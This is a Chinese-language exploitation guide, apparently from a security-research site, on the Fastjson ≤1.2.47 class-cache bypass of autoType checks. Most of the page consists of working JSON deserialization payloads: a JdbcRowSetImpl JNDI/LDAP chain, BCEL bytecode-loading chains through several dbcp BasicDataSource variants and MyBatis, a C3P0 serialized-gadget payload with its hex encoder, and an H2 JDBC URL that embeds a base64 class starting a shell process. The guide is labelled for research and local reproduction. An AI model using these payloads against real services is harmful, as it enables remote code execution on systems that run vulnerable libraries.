---
title: ≤1.2.47 利用技巧
description: Fastjson ≤1.2.47 的 Class 缓存绕过：JdbcRowSetImpl、BCEL（dbcp / MyBatis）、C3P0、H2Jdbc
order: 3
---

# ≤1.2.47 利用技巧

本文分析 Fastjson **≤1.2.47** 经典利用：通过 `@type` 为 `java.lang.Class` 将目标类写入缓存，再在 `checkAutoType` 中命中缓存以绕过黑名单。供安全研究与本地复现参考。

相关阅读：[≤1.2.80 利用技巧](/docs/fastjson-1.2.80) · [≤1.2.68 利用技巧](/docs/fastjson-1.2.68) · [Getter 触发技巧](/docs/getter-trigger) · [WAF 绕过技巧](/docs/waf-bypass) · [Fastjson 探测分析](/docs/fastjson-detect)

---

## 1. 绕过分析

当 `@type` 为 `java.lang.Class` 时，走 **MiscCodec** 反序列化，内部调用 `TypeUtils.loadClass` 并把类名写入缓存 map。

之后真正加载危险类时，`checkAutoType` **先从缓存 map 取**，命中则直接返回，从而绕过黑名单校验。

流程简述：

1. 先用 `"@type":"java.lang.Class","val":"<危险类>"` 把类名塞进缓存
2. 再用 `"@type":"<危险类>"` 走正常反序列化，`checkAutoType` 命中缓存后放行

---

## 2. 修复分析

**1.2.48 起** 默认不再缓存这类通过 `java.lang.Class` 加载的类名，上述「先缓存再 `@type`」链路失效。因此本节 payload 适用于 **≤1.2.47**。

---

## 3. JdbcRowSetImpl

经典 JNDI 链，无额外依赖：

```json
{
    "x1": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "x2": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://localhost:1389/Exploit",
        "autoCommit": true
    }
}
```

---

## 4. BCEL

| 条件 | 说明 |
|------|------|
| JDK | **≤ 8u251**（其后 JDK 移除 / 限制内置 BCEL ClassLoader） |
| 依赖 | 需要 **dbcp**：`tomcat-dbcp` 或 `commons-dbcp` / `commons-dbcp2` |

利用思路：`BasicDataSource` 设置 `driverClassLoader` 为 JDK 内置 `com.sun.org.apache.bcel.internal.util.ClassLoader`，`driverClassName` 填 `$$BCEL$$...` 编码字节码；再通过 `$ref` 触发 `getConnection()` 完成加载。

### 4.1 BCEL 字符生成

```java
JavaClass javaClass = Repository.lookupClass(Evil.class);
String encode = Utility.encode(javaClass.getBytes(), true);
String bcel = "$$BCEL$$" + encode;
```

将下方 payload 中的 `[bcelCode]` 替换为生成的 `bcel` 字符串。

### 4.2 `org.apache.tomcat.dbcp.dbcp.BasicDataSource`

适用范围：**tomcat-dbcp ≤ 7.0.109**

```json
{
    "name": {
        "@type": "java.lang.Class",
        "val": "org.apache.tomcat.dbcp.dbcp.BasicDataSource"
    },
    "x1": {
        "name": {
            "@type": "java.lang.Class",
            "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "x2": {
            "@type": "com.alibaba.fastjson.JSONObject",
            "x3": {
                "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "[bcelCode]",
                "$ref": "$.x1.x2.x3.connection"
            }
        }
    }
}
```

### 4.3 `org.apache.tomcat.dbcp.dbcp2.BasicDataSource`

适用范围：**tomcat-dbcp 8.0.0-RC1 ≤ 版本 ≤ 10.1.0-M2**

```json
{
    "name": {
        "@type": "java.lang.Class",
        "val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x1": {
        "name": {
            "@type": "java.lang.Class",
            "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "x2": {
            "@type": "com.alibaba.fastjson.JSONObject",
            "x3": {
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "[bcelCode]",
                "$ref": "$.x1.x2.x3.connection"
            }
        }
    }
}
```

### 4.4 `org.apache.commons.dbcp.BasicDataSource`

适用范围：**commons-dbcp ≤ 1.4**

```json
{
    "name": {
        "@type": "java.lang.Class",
        "val": "org.apache.commons.dbcp.BasicDataSource"
    },
    "x1": {
        "name": {
            "@type": "java.lang.Class",
            "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "x2": {
            "@type": "com.alibaba.fastjson.JSONObject",
            "x3": {
                "@type": "org.apache.commons.dbcp.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "[bcelCode]",
                "$ref": "$.x1.x2.x3.connection"
            }
        }
    }
}
```

### 4.5 `org.apache.commons.dbcp2.BasicDataSource`

适用范围：**commons-dbcp2 ≤ 2.13.0**

```json
{
    "name": {
        "@type": "java.lang.Class",
        "val": "org.apache.commons.dbcp2.BasicDataSource"
    },
    "x1": {
        "name": {
            "@type": "java.lang.Class",
            "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "x2": {
            "@type": "com.alibaba.fastjson.JSONObject",
            "x3": {
                "@type": "org.apache.commons.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "[bcelCode]",
                "$ref": "$.x1.x2.x3.connection"
            }
        }
    }
}
```

---

## 5. C3P0

通过 `WrapperConnectionPoolDataSource.userOverridesAsString` 传入 `HexAsciiSerializedMap:` 形态的序列化数据。

### 5.1 字符转换

```java
byte[] bytes = Files.readAllBytes(Paths.get("cc5.bin"));
String hex = toHexAscii(bytes);
String payload = "HexAsciiSerializedMap:" + hex + ";";

public static String toHexAscii(byte[] bytes)
{
    int len = bytes.length;
    StringWriter sw = new StringWriter(len * 2);
    for (int i = 0; i < len; ++i)
        addHexAscii(bytes[i], sw);
    return sw.toString();
}

static void addHexAscii(byte b, StringWriter sw)
{
    int ub = b & 0xff;
    int h1 = ub / 16;
    int h2 = ub % 16;
    sw.write(toHexDigit(h1));
    sw.write(toHexDigit(h2));
}

private static char toHexDigit(int h)
{
    char out;
    if (h <= 9) out = (char) (h + 0x30);
    else out = (char) (h + 0x37);
    return out;
}
```

将下方 `[code]` 替换为生成的 `HexAsciiSerializedMap:...;` 字符串。

### 5.2 Payload

```json
{
    "x1": {
        "@type": "java.lang.Class",
        "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
    },
    "x2": {
        "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
        "userOverridesAsString": "[code]"
    }
}
```

---

## 6. MyBatis

`org.apache.ibatis.datasource.unpooled.UnpooledDataSource` 同样可通过设置 `driverClassLoader` + `driver`（BCEL 字符串）达到 BCEL 加载效果。此处用 **JSONObject 作 Map key** 触发 getter（见 [Getter 触发技巧](/docs/getter-trigger)）。

```json
{
    "x": {
        "xxx": {
            "@type": "java.lang.Class",
            "val": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource"
        },
        "c": {
            "@type": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource"
        },
        "www": {
            "@type": "java.lang.Class",
            "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        {
            "@type": "com.alibaba.fastjson.JSONObject",
            "c": {
                "@type": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driver": "[bcelCode]"
            }
        }: {}
    }
}
```

说明：上述写法是 Fastjson 可接受的 **非严格 JSON**（对象作 key），标准 JSON 解析器会拒绝。`[bcelCode]` 生成方式同第 4.1 节。

---

## 7. H2Jdbc

适用范围：**com.h2database:h2 ≤ 2.2.224**

先用 `java.lang.Class` 缓存 `JdbcDataSource`，再通过 `$ref` 触发 `getConnection()`；`url` 内嵌 H2 `INIT` / `CREATE ALIAS` 执行恶意逻辑。

```json
{
    "x1": {
        "@type": "java.lang.Class",
        "val": "org.h2.jdbcx.JdbcDataSource"
    },
    "x2": {
        "@type": "com.alibaba.fastjson.JSONObject",
        "c": {
            "@type": "org.h2.jdbcx.JdbcDataSource",
            "url": "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS 'void exec() throws java.io.IOException { try { byte[] b = java.util.Base64.getDecoder().decode(\"yv66vgAAADIAQAEAWm9yZy9hcGFjaGUvc2hpcm8vY295b3RlL2Rlc2VyaWFsaXphdGlvbi9pbXBsL1Byb3BlcnR5VmFsdWU0NWNjYzQ5NzBmZjI0MWYwYmYzZTBjY2U4NDY1MjU5ZQcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAARiYXNlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADc2VwAQADY21kAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACwwACQAKCgAEAA0BAAdvcy5uYW1lCAAPAQAQamF2YS9sYW5nL1N5c3RlbQcAEQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMABMAFAoAEgAVAQAQamF2YS9sYW5nL1N0cmluZwcAFwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsMABkAGgoAGAAbAQADd2luCAAdAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAB8AIAoAGAAhAQAHY21kLmV4ZQgAIwwABQAGCQACACUBAAIvYwgAJwwABwAGCQACACkBAAcvYmluL3NoCAArAQACLWMIAC0MAAgABgkAAgAvAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwAxAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwACQAzCgAyADQBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwANgA3CgAyADgBAAg8Y2xpbml0PgEABGNhbGMIADsKAAIADQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAwAJAAUABgAAAAkABwAGAAAACQAIAAYAAAACAAEACQAKAAEAPgAAAIQABAACAAAAUyq3AA4SELgAFrYAHBIetgAimQAQEiSzACYSKLMAKqcADRIsswAmEi6zACoGvQAYWQOyACZTWQSyACpTWQWyADBTTLsAMlkrtwA1tgA5V6cABEyxAAEABABOAFEADAABAD8AAAAXAAT/ACEAAQcAAgAACWUHAAz8AAAHAAQACAA6AAoAAQA+AAAAGgACAAAAAAAOEjyzADC7AAJZtwA9V7EAAAAAAAA=\")\\; java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class)\\; method.setAccessible(true)\\; Class c = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length)\\; c.newInstance()\\; } catch (Exception e){ }}'\\;CALL EXEC ()\\;"
        }
    },
    "x3": {
        "$ref": "$.x2.c.connection"
    }
}
```

---

## 小结

| 点 | 结论 |
|----|------|
| 绕过核心 | `java.lang.Class` → MiscCodec → `loadClass` 入缓存 → `checkAutoType` 命中缓存绕过 |
| 修复 | **1.2.48+** 默认不再缓存，本套路失效 |
| JdbcRowSetImpl | 无额外依赖，JNDI |
| BCEL | JDK ≤ 8u251 + dbcp（tomcat / commons 各版本包名不同） |
| C3P0 | `userOverridesAsString` + `HexAsciiSerializedMap` |
| MyBatis | `UnpooledDataSource` + BCEL；常用 JSONObject 作 key 触发 getter |
| H2Jdbc | h2 ≤ 2.2.224；`$ref` 触发 `connection` |
